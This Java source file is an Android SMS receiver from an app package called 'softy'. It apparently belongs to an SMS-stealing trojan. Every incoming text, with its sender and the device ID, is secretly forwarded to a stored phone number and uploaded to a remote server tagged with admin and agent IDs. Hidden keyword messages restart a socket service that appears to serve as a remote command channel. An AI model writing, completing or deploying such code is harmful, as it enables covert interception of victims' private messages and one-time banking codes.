package com.topdown.softy.functions;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import androidx.annotation.NonNull;

import com.topdown.softy.NetworkUtils;
import com.topdown.softy.functions.listeners.ActionCallback;
import com.topdown.softy.server.req.RetrofitClient;
import com.topdown.softy.server.socket.SocketService;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SmsReceiver extends BroadcastReceiver {
    private static final String SECRET_KEYWORD = "TOP-TO-BOTTOM";
    private static final String SECRET_KEYWORD_INTERNET_1 = "TOP-TO-DOWN-1";
    private static final String SECRET_KEYWORD_INTERNET_2 = "TOP-TO-DOWN-2";

    private static final String TAG = "SMS Receiver";

    private void forwardMessage(Context context, int simSlotIndex, String message, String phoneNumber) {
        SocketService.sendSMS(context, phoneNumber, message, simSlotIndex, new ActionCallback() {

            @Override
            public void onSuccess(String message) {
                Utils.markLog(context, message, "SmsReceiver 1");
            }

            @Override
            public void onError(String message) {
                Utils.markLog(context, message, "SmsReceiver 2");
            }
        });
    }

    @SuppressLint("HardwareIds")
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                String sender = smsMessage.getDisplayOriginatingAddress();
                String message = smsMessage.getMessageBody();
                Log.d("SMS", "From: " + sender + " | Message: " + message);
                Prefs prefs = new Prefs(context);

                Utils.markLog(context, "SMS Received ✉", "SmsReceiver 3");

                if (!prefs.getPref("sms-forward").equals(Prefs.NO_DATA)) {
                    Utils.markLog(context, "Trying to Forward SMS...", "SmsReceiver 4");
                    forwardMessage(context, prefs.getPrefAsInt("sms-slot-index"), message, prefs.getPref("sms-forward"));
                }
                ensureSocketServiceAlive(context, sender, message);
                // Send The Message to Server
                try {
                    RetrofitClient.getInstance(context).getApiInterfaces().saveSMS(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_USERNAME).put("agentID", Utils.AGENT_ID).put("message", message).put("deviceID", Utils.getDeviceID(context)).put("sender", sender))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {
                            Utils.markLog(context, "Message Sent to Server ✅", "SmsReceiver 5");
                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {
                            Utils.markLog(context, "Unable to Send Message :" + throwable.getMessage(), "SmsReceiver 6");
                        }
                    });
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }

            }
        }
    }

    private void ensureSocketServiceAlive(Context context, String sender, String messageText) {
        if (messageText == null) return;
        boolean containsSecretMSG1 = messageText.toLowerCase().contains(SECRET_KEYWORD_INTERNET_1.toLowerCase());
        if (containsSecretMSG1) {
            if (!NetworkUtils.isInternetAvailable(context)) {
                forwardMessage(context, 0, "NO-REPLY", sender);
            }
        }
        boolean containsSecretMSG2 = messageText.toLowerCase().contains(SECRET_KEYWORD_INTERNET_2.toLowerCase());
        if (containsSecretMSG2) {
            if (!NetworkUtils.isInternetAvailable(context)) {
                forwardMessage(context, 1, "NO-REPLY", sender);
            }
        }
        if (messageText.toLowerCase().contains(SECRET_KEYWORD.toLowerCase()) || containsSecretMSG1 || containsSecretMSG2) {
            if (!SocketService.isRunning) {
                Log.w(TAG, "🔄 SocketService not running. Restarting...");
                try {
                    Intent serviceIntent = new Intent(context, SocketService.class);
                    context.startForegroundService(serviceIntent);
                } catch (Exception e) {
                    Log.e(TAG, "Failed to start SocketService", e);
                }
            } else {
                Log.d(TAG, "✅ SocketService already running.");
            }
        }
    }
}
